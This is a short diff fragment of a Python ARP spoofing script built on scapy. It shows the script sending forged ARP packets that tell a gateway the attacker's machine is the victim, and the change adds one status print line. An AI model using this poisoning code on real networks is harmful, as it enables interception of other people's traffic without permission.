@@ -93,3 +93,4 @@ if __name__ == '__main__':
 			# Telling the router 'I am the victim'
 			router_packet = scap.ARP(op=1, pdst=gateway_ip, hwaddr=attacker_mac, psrc=victim_ip)
 			scap.send(router_packet)
+			print('Poisoning router: ', gateway_ip, ' with victim: ', victim_ip)
